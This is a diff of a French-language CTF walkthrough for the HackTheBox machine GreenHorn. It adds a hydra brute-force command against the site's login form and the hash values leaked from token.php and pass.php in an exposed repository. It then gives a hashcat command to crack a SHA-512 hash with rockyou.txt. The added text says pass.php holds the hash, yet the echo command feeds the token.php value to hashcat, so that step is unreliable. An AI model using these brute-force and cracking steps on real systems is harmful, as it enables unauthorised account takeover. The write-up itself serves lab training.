@@ -54,7 +54,7 @@ cont1=test&bogus=&submit=Log+in
 ```
 On voit que le champ pour le mot de passe se nomme `cont1` et il semble y avoir un champ bogus qui est envoyé aussi pour prévenir le bruteforce.
 
-Une fois ces informations en mains, on essaye de cracker le login avec hydra:
+Une fois ces informations en mains, on essaye de cracker le login avec hydra et rockyou.txt:
 ```bash
 hydra -v -V -d -l username -P /home/kali/rockyou.txt -t 16 -m "/login.php:cont1=^PASS^&bogus=&submit=Log+in:F=incorrect" http-post-form://greenhorn.htb 
 ```
@@ -71,7 +71,20 @@ http://10.10.11.25:3000/GreenAdmin/GreenHorn
 ```
 
 En poussant la recherche plus loin, on trouve 2 fichiers intéressants, token.php et pass.php:
-```bash
+```php
 http://10.10.11.25:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/token.php
+<?php $token = '65c1e5cf86b4d727962672211b91924b828a0c05ece3954c75e3befa6b361fa3eb28c407f7101bc4eae2c604c96c641575c7fe82dbdc6ce0cf7d4a006f53bac7'; ?>
+```
+```php
 http://10.10.11.25:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php
+<?php
+$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';
+?>
+```
+
+On réalise vite que pass.php contient un hash sha-512.
+On tente donc de le décoder avec hashcat et rockyou.txt
+```bash
+echo "65c1e5cf86b4d727962672211b91924b828a0c05ece3954c75e3befa6b361fa3eb28c407f7101bc4eae2c604c96c641575c7fe82dbdc6ce0cf7d4a006f53bac7" > hashes.txt
+hashcat -m 1700 -a 0 hashes.txt /home/kali/rockyou.txt
 ```
